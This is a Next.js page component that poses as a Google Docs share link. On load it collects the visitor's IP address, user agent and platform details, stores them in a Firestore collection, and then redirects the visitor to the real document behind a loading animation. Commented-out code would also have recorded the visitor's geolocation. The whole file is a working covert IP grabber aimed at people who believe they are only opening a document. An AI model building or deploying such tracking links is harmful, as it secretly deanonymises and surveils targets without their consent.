"use client"

import { redirect } from 'next/navigation'
import { useEffect, useState } from 'react';
import {db} from '@/config/firebaConfig'
import {collection, addDoc, Timestamp } from 'firebase/firestore'
import { useSearchParams } from 'next/navigation';
import Head from 'next/head'




function Test({params}) {


  const ipCollectionRef = collection(db,"ips");

  const searchParams = useSearchParams();

  const [ip, setIp] = useState();

  // const [title, setTitle] = useState("");

  const page = searchParams.get('usp');

    useEffect(()=>{
      // async function getPageTitle() {
      //   try {
      //     const response = await fetch(`https://docs.google.com/document/d/${params.id}/edit?usp=sharing`);
      //     if (response.ok) {
      //       const html = await response.text();
      //       const titleMatch = /<title>(.*?)<\/title>/i.exec(html);
      //       const pageTitle = titleMatch ? titleMatch[1] : 'Title not found';
      //       console.log(pageTitle);
      //       setTitle(pageTitle);
      //       document.title = pageTitle;
      //     } else {
      //       throw new Error('Network response was not ok.');
      //     }
      //   } catch (error) {
      //     throw new Error('Error fetching the page:', error);
      //   }
      // }
      // getPageTitle();

      async function ipFetch(){

        await fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(async data => {
          setIp(data.ip);
          console.log('Your IP address is: ',ip);
          // navigator.geolocation.getCurrentPosition(
          //   (position) => {
          //     const latitude = position.coords.latitude;
          //     const longitude = position.coords.longitude;
          //     console.log(`Latitude: ${latitude}, Longitude: ${longitude}`)

          //     addDoc(ipCollectionRef,{ip:data.ip, 
          //       createAt: Timestamp.fromDate(new Date()), 
          //       location: `${latitude} ${longitude} `})

          //   }
          // );
          // User Agent
          const userAgent = navigator.userAgent;

          // Browser Information
          const appName = navigator.appName;
          const appVersion = navigator.appVersion;
          const platform = navigator.platform; 

          await addDoc(ipCollectionRef,{ip:data.ip, 
            createAt: Timestamp.fromDate(new Date()),
            userAgent,
            appName,
            appVersion,
            platform
            
            })


            .then(()=>{
              window.location.href = `https://docs.google.com/document/d/${params.id}/edit?usp=sharing`;
              // switch (params.id) {
              //   case '1Rt0NlC-G361vHwViwqcAXtJqPYsWnL5dLF2r3gjXSA4v':
              //     window.location.href = 'https://example.com';
              //     // redirect('https://example.com');
              //     break;
              //   case 'google':
              //     window.location.href = 'https://google.com';
              //     // redirect('https://google.com');
              //     break;
              //   default:
              //     console.log(params.id);
              //     break;
              // }
            })
        })

      }

    
      ipFetch();
    }, [])

  return (
    <div className='flex flex-col m-3 justify-center items-center h-screen'>    
       
        {/* {params.id}
        <div>
        {ip}
        </div> */}

        {/* {page} */}

        <div className="rounded-full h-20 w-20 bg-blue-400 animate-ping"></div>
    </div>
   
  )
}

export default Test